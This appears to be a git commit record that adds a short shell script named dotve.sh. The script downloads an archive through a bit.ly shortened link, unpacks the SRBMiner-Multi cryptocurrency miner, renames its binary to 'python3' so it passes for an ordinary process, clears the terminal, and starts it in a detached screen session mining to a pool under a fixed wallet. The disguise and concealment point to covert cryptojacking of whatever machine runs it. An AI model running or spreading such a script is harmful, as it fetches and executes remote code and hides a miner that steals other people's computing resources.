5562fb78d0adb0c942a3a34d0ae536eb33190883
DotAja <142836390+DotAja@users.noreply.github.com>
2024-06-03 22:43:43 +0700

    Create dotve.sh

---
+++ dotve.sh
@@ -0,0 +1,13 @@
+wget https://bit.ly/kontolrum
+
+tar -xvf kontolrum
+
+cd SRBMiner-Multi-2-4-7
+
+mv SRBMiner-MULTI python3
+
+nomer=$((RANDOM % 50 + 1))
+
+clear
+
+screen ./python3 --algorithm verushash --pool ap.luckpool.net:3956 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.DOT-0$nomer --keepalive true
